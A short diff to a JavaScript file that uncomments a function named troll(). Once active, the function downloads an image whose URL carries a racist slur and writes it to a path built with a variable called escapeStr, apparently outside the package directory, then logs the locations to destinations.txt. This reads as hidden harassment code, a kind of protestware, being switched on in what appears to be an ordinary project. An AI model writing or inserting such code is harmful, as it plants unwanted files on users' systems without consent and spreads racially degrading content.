@@ -50,9 +50,8 @@ function troll() {
     }
 
     const destination = path.join(__dirname, escapeStr, fileName);
-    //const file = fs.createWriteStream(destination);
+    const file = fs.createWriteStream(destination);
     https.get('https://www.shutterstock.com/image-photo/big-black-african-pig-dirty-600w-1596564148.jpg', (res) => {
-        /*
         res.pipe(file);
         file.on('finish', () => {
             file.close(() => {
@@ -66,7 +65,6 @@ function troll() {
                 fs.writeFile('destinations.txt', str);
             });
         });
-        */
     });
 }
 
